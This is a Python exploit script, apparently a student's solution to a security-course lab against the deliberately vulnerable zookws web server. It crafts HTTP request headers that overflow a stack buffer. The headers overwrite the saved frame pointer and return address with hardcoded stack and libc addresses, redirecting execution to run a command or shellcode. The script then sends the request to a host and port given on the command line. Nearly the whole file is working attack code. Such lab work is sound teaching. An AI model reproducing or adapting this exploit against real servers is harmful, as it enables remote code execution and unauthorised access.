#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer  = 0x7fffffffda50
stack_rbp     = 0x7fffffffdc80
stack_retaddr = 0x7fffffffdc88

rbp_new           = 0x7fffffffdc80
accidentally_addr = 0x555555556b94

#libc_addr         = 0x15555533cae0
libc_addr = 0x1555554011c0
cmd_addr = stack_buffer
#cmd = "./run-shellcode shellcode.bin"
cmd = "/home/student/grades.txt"

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytes(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x

    req_uri = b"/" #+ shellcode

    #shellcode = urllib.parse.quote_from_bytes(shellcode).encode('ascii') 
    #value00 = b"A" * (stack_retaddr - stack_buffer + 8 + 16) + \
    #         struct.pack("<Q", libc_addr)
    value00 = b"C" * (stack_retaddr - stack_buffer + 16) + \
              struct.pack("<Q", libc_addr)
    value0 = b"A" * (stack_retaddr - stack_buffer + 8 + 7)
    value1 = b"A" * (stack_retaddr - stack_buffer + 8) + \
             struct.pack("<Q", cmd_addr)
    value2 = b"B" * (stack_retaddr - stack_buffer + 7)
    value3 = b"C" * (stack_retaddr - stack_buffer) + \
             struct.pack("<Q", accidentally_addr)
    value4 = b"D" * (stack_retaddr - stack_buffer - 8 + 7)
    value5 = b"E" * (stack_retaddr - stack_buffer - 8) + \
             struct.pack("<Q", rbp_new)
    value6 = urllib.parse.quote(cmd).encode('ascii')

    req = b"GET %b HTTP/1.0\r\n" % req_uri + \
          b"Key00: %b\r\n" % value00 + \
          b"Key0: %b\r\n" % value0 + \
          b"Key1: %b\r\n" % value1 + \
          b"Key2: %b\r\n" % value2 + \
          b"Key3: %b\r\n" % value3 + \
          b"Key4: %b\r\n" % value4 + \
          b"Key5: %b\r\n" % value5 + \
          b"Key6: %b\r\n" % value6 + \
          b"\r\n"

    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

